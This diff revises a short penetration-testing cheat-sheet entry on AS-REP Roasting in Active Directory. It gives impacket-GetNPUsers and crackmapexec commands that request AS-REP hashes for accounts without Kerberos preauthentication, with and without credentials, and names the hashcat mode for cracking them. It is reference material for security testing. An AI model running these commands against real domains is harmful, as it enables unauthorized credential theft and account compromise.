@@ -1,7 +1,13 @@
 # AS-REP Roasting
-If a domain user does not have Kerberos preauthentication 'DONT_REQ_PREAUTH' enabled, an AS-REP can be successfully requested for the user. Getting a TGT.
-`impacket-GetNPUsers '<DOMAIN>/' -dc-ip <IP> -usersfile <USERLIST> -no-pass` (Users from file)
-`impacket-GetNPUsers '<DOMAIN>/<USER>:<PASS>' -request -outputfile HASH` (All from domain)
-`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT.TXT>`
+AS-REP attacks do not require the attacker to know the password for the account they are attempting to compromise. The attacker can obtain an AS-REP hash, crack it and obtain the password, provided the Kerberos preauthentication feature is disabled for that account.
 
-Check output & dc-ip & request
+When having credential for a non pre-auth account, the attacker can get the AS-REP hash for all non pre-auth accounts.
+
+hashcat -m 18200
+
+Without creds - users from file:
+`impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>` 
+
+With creds - all non pre-auth accounts from domain:
+`impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request`
+`crackmapexec ldap <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT.TXT>`
